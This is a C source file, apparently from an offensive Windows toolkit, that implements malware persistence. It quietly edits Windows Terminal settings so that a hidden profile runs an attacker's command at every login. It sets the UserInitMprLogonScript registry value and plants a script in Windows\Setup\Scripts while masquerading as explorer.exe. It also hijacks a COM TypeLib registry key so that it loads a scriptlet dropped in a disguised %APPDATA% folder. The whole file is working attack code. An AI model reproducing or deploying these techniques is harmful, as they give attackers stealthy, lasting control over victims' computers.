#include "pch.h"

LPWSTR WTFindSettingPath(VOID)
{
	WCHAR lpLocalAppData[MAX_PATH];
	DWORD cbLocalAppData;
	LPWSTR lpResult = NULL;
	LPWSTR* PathList = NULL;

	RtlSecureZeroMemory(lpLocalAppData, sizeof(lpLocalAppData));
	if (ExpandEnvironmentStringsW(L"%LOCALAPPDATA%\\Packages", lpLocalAppData, MAX_PATH) >= MAX_PATH) {
		goto CLEANUP;
	}

	PathList = ListFileWithFilter(lpLocalAppData, L"Microsoft.WindowsTerminal_*", LIST_JUST_FOLDER, NULL);
	if (PathList == NULL) {
		goto CLEANUP;
	}

	lpResult = DuplicateStrW(PathList[0], lstrlenW(L"\\LocalState\\settings.json"));
	lstrcatW(lpResult, L"\\LocalState\\settings.json");
CLEANUP:
	FREE(PathList);

	return lpResult;
}

BOOL WTChangeSettingsFile
(
	_In_ LPWSTR lpPath,
	_In_ LPSTR lpCommandLine
)
{
	LPSTR lpJsonData = NULL;
	BOOL Result = FALSE;
	DWORD dwInsertedPoint = 0;
	LPSTR lpGuid = NULL;
	CHAR szInsertedStr[0x400];
	DWORD cbInsertedStr = 0;
	LPSTR lpDoulbeSlashPath = NULL;
	LPSTR lpRandomStr = NULL;
	LPSTR lpNewJsonData = NULL;
	LPSTR lpTemp = NULL;

	lpJsonData = ReadFromFile(lpPath, NULL);
	if (lpJsonData == NULL) {
		goto CLEANUP;
	}

	lpGuid = GenGUIDStrA();
	if (lpGuid == NULL) {
		goto CLEANUP;
	}

	lpDoulbeSlashPath = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
	lpRandomStr = GenRandomStr(6);
	wsprintfA(szInsertedStr, "            {\n                \"commandline\": \"%s\",\n                \"guid\": \"%s\",\n                \"hidden\": true,\n                \"name\": \"%s\"\n            },\n", lpDoulbeSlashPath, lpGuid, lpRandomStr);

	dwInsertedPoint = StrStrA(lpJsonData, "\n    \"profiles\": \n") - lpJsonData + lstrlenA("\n    \"profiles\": \n");
	dwInsertedPoint = StrStrA(lpJsonData + dwInsertedPoint, "\n        \"list\": \n        [\n") - lpJsonData + lstrlenA("\n        \"list\": \n        [\n");
	lpNewJsonData = StrInsertA(lpJsonData, szInsertedStr, dwInsertedPoint);
	dwInsertedPoint = StrStrA(lpNewJsonData, "\n    \"defaultProfile\": \"") - lpNewJsonData + lstrlenA("\n    \"defaultProfile\": \"");
	memcpy(lpNewJsonData + dwInsertedPoint, lpGuid, lstrlenA(lpGuid));
	lpTemp = StrStrA(lpNewJsonData, "\n    \"startOnUserLogin\": ");
	if (lpTemp) {
		dwInsertedPoint = lpTemp - lpNewJsonData + lstrlenA("\n    \"startOnUserLogin\": ");
		if (!IsStrStartsWithA(lpNewJsonData + dwInsertedPoint, "true")) {
			lpTemp = StrReplaceA(lpNewJsonData + dwInsertedPoint, "false", "true", FALSE, 1);
			lpNewJsonData[dwInsertedPoint] = '\0';
			lstrcatA(lpNewJsonData, lpTemp);
			FREE(lpTemp);
		}
	}
	else {
		dwInsertedPoint += lstrlenA(lpGuid) + 3;
		lpTemp = StrInsertA(lpNewJsonData, "    \"startOnUserLogin\": true,\n", dwInsertedPoint);
		FREE(lpNewJsonData);
		lpNewJsonData = lpTemp;
	}

	WriteToFile(lpPath, lpNewJsonData, lstrlenA(lpNewJsonData));
	Result = TRUE;
CLEANUP:
	FREE(lpGuid);
	FREE(lpDoulbeSlashPath);
	FREE(lpNewJsonData);
	FREE(lpRandomStr);
	FREE(lpJsonData);

	return Result;
}

BOOL WTIsPersistenceExist
(
	_In_ LPWSTR lpPath,
	_In_ LPSTR lpCommandLine
)
{
	LPSTR lpJsonData = NULL;
	BOOL Result = FALSE;
	LPSTR lpDoulbeSlashPath = NULL;
	DWORD dwPos = 0;
	CHAR szGUID[39];
	LPSTR lpTemp = NULL;

	lpJsonData = ReadFromFile(lpPath, NULL);
	if (lpJsonData == NULL) {
		goto CLEANUP;
	}

	lpDoulbeSlashPath = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
	if (!StrStrA(lpJsonData, lpDoulbeSlashPath)) {
		goto CLEANUP;
	}

	if (!StrStrA(lpJsonData, "\n    \"startOnUserLogin\": true")) {
		goto CLEANUP;
	}

	dwPos = StrStrA(lpJsonData, "\n    \"defaultProfile\": \"") - lpJsonData + lstrlenA("\n    \"defaultProfile\": \"");
	RtlSecureZeroMemory(szGUID, sizeof(szGUID));
	memcpy(szGUID, lpJsonData + dwPos, 38);
	lpTemp = StrStrA(lpJsonData, "\n        \"list\": \n        [\n");
	if (!lpTemp) {
		goto CLEANUP;
	}

	lpTemp = StrStrA(lpJsonData, lpDoulbeSlashPath) + lstrlenA(lpDoulbeSlashPath) + lstrlenA("\",\n                \"guid\": \"");
	if (memcmp(lpTemp, szGUID, lstrlenA(szGUID))) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FREE(lpJsonData);
	FREE(lpDoulbeSlashPath);

	return Result;
}

BOOL WTStartPersistence
(
	_In_ LPSTR lpCommandLine
)
{
	LPWSTR lpSettingsPath = NULL;
	BOOL Result = FALSE;

	lpSettingsPath = WTFindSettingPath();
	if (lpSettingsPath == NULL) {
		goto CLEANUP;
	}

	if (!WTIsPersistenceExist(lpSettingsPath, lpCommandLine)) {
		WTChangeSettingsFile(lpSettingsPath, lpCommandLine);
	}

	Result = TRUE;
CLEANUP:
	FREE(lpSettingsPath);

	return Result;
}

BOOL SetupScriptMethod
(
	_In_ LPSTR lpCommandLine
)
{
	PBYTE pCmdContent = NULL;
	DWORD cbCmdContent = 0;
	BOOL Result = FALSE;
	LPWSTR lpCmdPath = NULL;
	WCHAR wszDest[MAX_PATH];

	cbCmdContent = lstrlenA(lpCommandLine) + lstrlenA("@echo off\n");
	pCmdContent = ALLOC(cbCmdContent + 1);
	wsprintfA(pCmdContent, "@echo off\n%s", lpCommandLine);
	if (!WriteToTempPath(pCmdContent, cbCmdContent, L"cmd", &lpCmdPath)) {
		goto CLEANUP;
	}

	RtlSecureZeroMemory(wszDest, sizeof(wszDest));
	GetWindowsDirectoryW(wszDest, MAX_PATH);
	lstrcatW(wszDest, L"\\Setup\\Scripts");
	if (!MasqueradedMoveCopyDirectoryFileCOM(lpCmdPath, wszDest, TRUE)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FREE(pCmdContent);
	FREE(lpCmdPath);

	return Result;
}

BOOL PersistenceMethod1
(
	_In_ LPSTR lpCommandLine
)
{
	LSTATUS Status = STATUS_SUCCESS;
	BOOL Result = FALSE;
	WCHAR wszSetupPath[MAX_PATH];
	WCHAR wszExplorerPath[MAX_PATH];
	LPWSTR BackupPath[5];

	RtlSecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
	lstrcatW(wszExplorerPath, L"\\explorer.exe");
	RtlSecureZeroMemory(BackupPath, sizeof(BackupPath));
	MasqueradeProcessPath(wszExplorerPath, FALSE, BackupPath);
	RtlSecureZeroMemory(wszSetupPath, sizeof(wszSetupPath));
	GetSystemDirectoryW(wszSetupPath, _countof(wszSetupPath));
	lstrcatW(wszSetupPath, L"\\oobe\\Setup.exe");
	Status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"UserInitMprLogonScript", REG_SZ, wszSetupPath, (lstrlenW(wszSetupPath) + 1) * sizeof(WCHAR));
	if (!NT_SUCCESS(Status)) {
		LOG_ERROR("RegSetKeyValueW", Status);
		goto CLEANUP;
	}

	if (!SetupScriptMethod(lpCommandLine)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	MasqueradeProcessPath(NULL, TRUE, BackupPath);
	return Result;
}

BOOL PersistenceMethod2
(
	_In_ LPSTR lpCommandLine
)
{
	CHAR szTypeLibPath[] = "SOFTWARE\\Classes\\TypeLib\\{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}";
	LSTATUS Status = ERROR_SUCCESS;
	HKEY hKey = NULL;
	HKEY hTypeLibHkey = NULL;
	HKEY hWin64 = NULL;
	HKEY hWin32 = NULL;
	HKEY hZero = NULL;
	BOOL Result = FALSE;
	CHAR szTemplate[] = "<?xml version=\"1.0\"?>\n<scriptlet>\n    <Registration\n        description=\"For Fun\"\n        progid=\"FORFUN\"\n        version=\"1.0\"\n    </Registration>\n    <script language=\"JScript\">\n        <![CDATA[\n            var WShell = new ActiveXObject(\"WScript.Shell\");\n            WShell.Run(\"%s\");\n        ]]>\n    </script>\n</scriptlet>";
	LPSTR lpSctContent = NULL;
	LPSTR lpSctPath = NULL;
	LPWSTR lpTempPath = NULL;

	Status = RegOpenKeyExA(HKEY_CURRENT_USER, szTypeLibPath, 0, KEY_READ, &hKey);
	if (Status != ERROR_PATH_NOT_FOUND && Status != ERROR_FILE_NOT_FOUND) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\TypeLib", 0, KEY_WRITE, &hKey);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegOpenKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegCreateKeyExA(hKey, "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}\\1.1\\0", 0, NULL, 0, KEY_WRITE, NULL, &hTypeLibHkey, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegCreateKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegCreateKeyExA(hTypeLibHkey, "win64", 0, NULL, 0, KEY_WRITE, NULL, &hWin64, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegCreateKeyExA", Status);
		goto CLEANUP;
	}

	Status = RegCreateKeyExA(hTypeLibHkey, "win32", 0, NULL, 0, KEY_WRITE, NULL, &hWin32, NULL);
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegCreateKeyExA", Status);
		goto CLEANUP;
	}

	lpSctPath = ALLOC(MAX_PATH);
	ExpandEnvironmentStringsA("%APPDATA%\\com.logi", lpSctPath, MAX_PATH);
	if (!CreateDirectoryA(lpSctPath, NULL)) {
		LOG_ERROR("CreateDirectoryA", GetLastError());
		goto CLEANUP;
	}

	lstrcatA(lpSctPath, "\\log.sct");
	lpSctContent = ALLOC(lstrlenA(szTemplate) + lstrlenA(lpCommandLine));
	wsprintfA(lpSctContent, szTemplate, lpCommandLine);
	lpTempPath = ConvertCharToWchar(lpSctPath);
	if (!WriteToFile(lpTempPath, lpSctContent, lstrlenA(lpSctContent))) {
		goto CLEANUP;
	}

	Status = RegSetValueA(hWin64, NULL, REG_SZ, lpSctPath, lstrlenA(lpSctPath));
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegSetValueA", Status);
		goto CLEANUP;
	}

	Status = RegSetValueA(hWin32, NULL, REG_SZ, lpSctPath, lstrlenA(lpSctPath));
	if (Status != ERROR_SUCCESS) {
		LOG_ERROR("RegSetValueA", Status);
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	if (hKey != NULL) {
		RegCloseKey(hKey);
	}

	if (hTypeLibHkey != NULL) {
		RegCloseKey(hTypeLibHkey);
	}

	if (hWin64 != NULL) {
		RegCloseKey(hWin64);
	}

	if (hWin32 != NULL) {
		RegCloseKey(hWin32);
	}

	if (lpSctPath != NULL) {
		FREE(lpSctPath);
	}

	if (lpTempPath != NULL) {
		FREE(lpTempPath);
	}

	if (lpSctContent != NULL) {
		FREE(lpSctContent);
	}

	return Result;
}